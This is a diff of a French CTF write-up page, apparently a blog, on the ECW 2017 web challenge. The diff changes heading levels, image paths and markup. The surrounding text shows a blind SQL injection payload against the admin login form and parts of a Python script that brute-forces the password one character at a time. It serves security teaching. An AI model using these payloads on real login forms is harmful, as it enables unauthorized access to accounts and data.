@@ -70,7 +70,7 @@
       
       
       <div class="author-image">
-        <img src="/img/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+        <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
       </div>
       
     </a>
@@ -196,6 +196,9 @@
           <a class="badge badge-tag" href="/tags/ctf">ctf</a>
            
       
+          <a class="badge badge-tag" href="/tags/challenge">challenge</a>
+           
+      
           <a class="badge badge-tag" href="/tags/blind">blind</a>
            
       
@@ -220,17 +223,17 @@
 
 <p>Du 06/10 au 22/10 2017, il sert de pré-sélection pour l’épreuve finale de type Capture The Flag qui débutera le 29 novembre 2017 lors de la conférence de l’European Cyber Week à Rennes.</p>
 
-<h1 id="découverte">Découverte</h1>
+<h2 id="découverte">Découverte</h2>
 
 <p>Le challenge commence en présentant un formulaire d’authentification. On nous demande de nous identifier avec le compte administrateur. Le username n’est pas spécifié, mais il est dit qu’il s’agit d’un “identifiant simple”… Outre la partie devinette, on pense de suite à “admin”.</p>
 
-<h1 id="tests-et-hypothèses">Tests et hypothèses</h1>
+<h2 id="tests-et-hypothèses">Tests et hypothèses</h2>
 
 <p>N’ayant que ce formulaire sous la main, tout l’intérêt du challenge réside dans le fait de réussir à bypass l’authentification afin d’accéder à la zone d’administration.</p>
 
 <p>On tente différentes injections et différentes tentatives de connexion. On remarque un message d’erreur lorsque que le couple identifiant/password est invalide.</p>
 
-<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_1.png" alt="path_through_1"/></center></p>
+<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_1.png" alt="path_through_1" class="imgSize"/></center></p>
 
 <p>On a donc un retour “booléen”. Soit c’est valide, soit ça ne l’est pas. À partir de là, on pense à une Injection SQL en aveugle (blind SQLi).</p>
 
@@ -242,11 +245,11 @@ Le but est de rendre la requête vraie. On se basera pour cela sur le message af
 <pre><code>username=admin&amp;password=' or substring(password,1,1)='E
 </code></pre>
 
-<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_2.png" alt="path_through_2"/></center></p>
+<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_2.png" alt="path_through_2" class="imgSize"/></center></p>
 
 <p>On a donc effectivement une Injection SQL en aveugle ! Passons à l’exploitation.</p>
 
-<h1 id="exploitation-et-bypass">Exploitation et Bypass</h1>
+<h2 id="exploitation-et-bypass">Exploitation et Bypass</h2>
 
 <p>Deux solutions s’offrent à nous pour réussir l’exploitation de la vulnérabilité.
 On peut réaliser l’exploitation à la main, en essayant de deviner les caractères suivants, comme ceci :</p>
@@ -273,7 +276,7 @@ import string
 import sys
 requests.packages.urllib3.disable_warnings()
 
-# Request needed informations
+## Request needed informations
 BASE_URL = &quot;https://challenge-ecw.fr/chals/web100&quot;
 PARAMS = {
 'username': 'admin',
@@ -281,14 +284,14 @@ PARAMS = {
 'nonce' : '58109a1ef582bab83c89b9435d455e527b44736e43d64750604f7c2a3012f404ba282e19278431cad17852fa9475b2a01a8ddf9551d6b6cfaa5fa6311ceddb5a',
 }
 
-# Static variables
+## Static variables
 KEYWORD = &quot;Le mot de passe est le flag.&quot;
 MAX_PWD_LENGTH = 255
 URL = &quot;https://challenge-ecw.fr/chals/web100&quot;
 VULNERABLE_PARAM = &quot;password=&quot;
 INJECTION_USED = &quot;username=admin&amp;password=' or substring(password,1,1)='E&quot;
 
-# Password variables
+## Password variables
 passwordLength = 37
 password = &quot;ECW{&quot;
 
@@ -328,16 +331,16 @@ print(&quot;\n[+] Done\n&quot;)
 print(&quot;[+] Password is %s\n&quot; % password)
 </code></pre>
 
-<h1 id="récupération-du-flag">Récupération du Flag</h1>
+<h2 id="récupération-du-flag">Récupération du Flag</h2>
 
 <p>On exécute notre script et là..</p>
 
-<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_3.png" alt="path_through_3"/></center></p>
+<p><center><img src="/img/writeups/ecw-2017/web-path-through/pt_3.png" alt="path_through_3" class="imgSize"/></center></p>
 
 <p>Bingo ! Le flag est à nous.
 Challenge présentant donc une blind SQLi assez basique mais néanmoins intéressant pour apprendre ou rafraichir les connaissances.</p>
 
-<h1 id="références">Références</h1>
+<h2 id="références">Références</h2>
 
 <ul>
 <li><a href="http://www.mcherifi.org/hacking/sql-injection-avancee-blind-sql-injection.html" target="blank">SQL injection avancée: Blind SQL injection</a></li>
